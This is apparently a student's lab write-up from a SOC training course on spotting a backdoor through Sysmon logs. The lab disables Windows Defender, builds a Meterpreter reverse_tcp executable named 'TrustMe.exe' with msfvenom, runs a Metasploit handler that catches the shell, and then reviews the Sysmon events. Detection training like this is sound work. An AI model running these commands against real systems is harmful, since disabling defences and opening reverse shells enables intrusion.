---
tags:
  - sysmon
  - live-windows-forensics
  - lab-soc-core-skills
date: Feb 09, 2024
---

## Sysmon

> _Disclaimer: The content, procedures, and materials provided in this lab are strictly for educational purposes. Any information acquired is intended solely for advancing knowledge in cybersecurity. All procedures outlined in this lab, along with the VM utilized, were developed and acquired from the [SOC Core Skills](https://www.antisyphontraining.com/on-demand-courses/soc-core-skills-w-john-strand/) course instructed by [John Strand](https://www.sans.org/profiles/john-strand/). It is emphasized that the knowledge gained here will not be applied for any unauthorized or malicious activities._

> In this lab, we initiated a simple backdoor and backdoor listener while leveraging a Metasploit Handler. The primary focus was on utilizing Sysmon to detect potential threats. Sysmon, a powerful system monitoring tool, aids SOC analysts by tracking various system activities such as process creation, network connections, and file modifications. Through Sysmon logs analysis, SOC teams can swiftly identify suspicious behavior, particularly those associated with backdoors or malicious activity. This hands-on exercise not only strengthens understanding of backdoor threats but also equips SOC analysts with practical skills in leveraging Sysmon for enhanced threat detection and response capabilities.

---
First, let’s disable Defender. Simply run the following from an Administrator PowerShell prompt:

`Set-MpPreference -DisableRealtimeMonitoring $true`

This will disable Defender for this session.

If you get angry red errors, that is Ok, it means Defender is not running.

Next, let’s start up the ADHD Linux system and set up our malware and C2 listener: 

Let's get started by opening a Terminal as Administrator

![](_attachments/Pasted%20image%2020240211032106.png)

When you get the User Account Control Prompt, select Yes.

And, open a Ubuntu command prompt:

![](_attachments/Pasted%20image%2020240211032132.png)

On your Linux system, please run the following command:

$`ifconfig`

![](_attachments/Pasted%20image%2020240211032151.png)

Please note the IP address of your Ethernet adapter.  

Please note that my adaptor is called eth0 and my IP address is 172.17.32.119.   

Your IP Address and adapter name may be different.


Now, run the following commands to start a simple backdoor and backdoor listener: 
 

 `sudo su -`
Please note, the adhd password is adhd.

`msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=<YOUR LINUX IP> lport=4444 
-f exe -o /tmp/TrustMe.exe`

![](_attachments/Pasted%20image%2020240211032210.png)

`cd /tmp`

`ls -l TrustMe.exe`

`cp ./TrustMe.exe /mnt/c/tools`

![](_attachments/Pasted%20image%2020240211032227.png)


Now, let's start the Metasploit Handler.  First, open a new Ubuntu Terminal by clicking the down carrot then selecting Ubuntu-18.04.

Let's become root.

`sudo su -`


root@DESKTOP-I1T2G01:/tmp# `msfconsole -q`

msf5 > `use exploit/multi/handler`

msf5 exploit(multi/handler) > `set PAYLOAD windows/meterpreter/reverse_tcp`

PAYLOAD => windows/meterpreter/reverse_tcp

msf5 exploit(multi/handler) > `set LHOST 172.26.19.133`

Remember, your IP will be different!

msf5 exploit(multi/handler) > `exploit`


It should look like this:

![](_attachments/Pasted%20image%2020240211032248.png)

Now, we will need to open an cmd.exe terminal as Administrator.

When you get the pop up select Yes.

Next, to open a Command Prompt Window, select the Down Carrot ! and then select Command Prompt.

Then, type the following:



C:\Windows\system32>`cd \Tools`

C:\Tools>`Sysmon64.exe -accepteula -i sysmonconfig-export.xml`


It should look like this:

![](_attachments/Pasted%20image%2020240211032313.png)


let's run the following commands to run the TrustMe.exe file.

`cd \tools`
 
 `TrustMe.exe`


Back at your Ubuntu prompt, you should have a metasploit session!

![](_attachments/Pasted%20image%2020240211032334.png)


Now, we need to view the Sysmon events for this malware:

You will select Event Viewer > Applications and Services Logs > Windows > Sysmon > Operational

![](_attachments/Pasted%20image%2020240211032419.png)

![](_attachments/Pasted%20image%2020240211032439.png)


Start at the top and work down through the logs, you should see your malware executing.  Please note your paths may be different.

![](_attachments/Pasted%20image%2020240211032508.png)
